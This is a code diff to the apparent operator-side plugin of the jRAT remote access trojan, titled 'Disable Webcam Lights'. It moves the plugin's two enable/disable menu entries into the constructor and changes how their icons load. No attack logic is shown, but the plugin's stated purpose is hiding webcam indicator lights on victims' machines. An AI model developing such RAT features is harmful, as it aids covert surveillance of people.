@@ -1,8 +1,9 @@
 package jrat.plugin.dwl.client;
 
+import iconlib.IconUtils;
+
 import java.awt.event.ActionListener;
 import java.io.File;
-import java.util.ArrayList;
 import java.util.List;
 
 import javax.swing.ImageIcon;
@@ -30,6 +31,12 @@ public class DWLPlugin extends RATPlugin {
 	
 	public DWLPlugin() {
 		super("Disable Webcam Lights", "1.0", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab");
+		
+		RATMenuItem entry = new RATMenuItem(new MenuListener(true), "Enable Webcam Lights", IconUtils.getIcon("icon-plus", DWLPlugin.class));
+		RATMenuItem.addItem(entry);
+
+		entry = new RATMenuItem(new MenuListener(false), "Disable Webcam Lights", IconUtils.getIcon("icon-minus", DWLPlugin.class));
+		RATMenuItem.addItem(entry);
 	}
 	
 	public void onEnable(OnEnableEvent event) throws Exception {
@@ -52,17 +59,6 @@ public class DWLPlugin extends RATPlugin {
 	// Server disconnected from us
 	public void onDisconnect(OnDisconnectEvent event) throws Exception {
 
-	}
-
-	// List of right click menu items, return null if none
-	public List<RATMenuItem> getMenuItems() {
-		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
-		RATMenuItem entry = new RATMenuItem(new MenuListener(true), "Enable Webcam Lights", new ImageIcon(ICON_ENABLE_LOCATION));
-		RATMenuItem entry1 = new RATMenuItem(new MenuListener(false), "Disable Webcam Lights", new ImageIcon(ICON_DISABLE_LOCATION));
-
-		list.add(entry);
-		list.add(entry1);
-		return list;
 	}
 
 	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
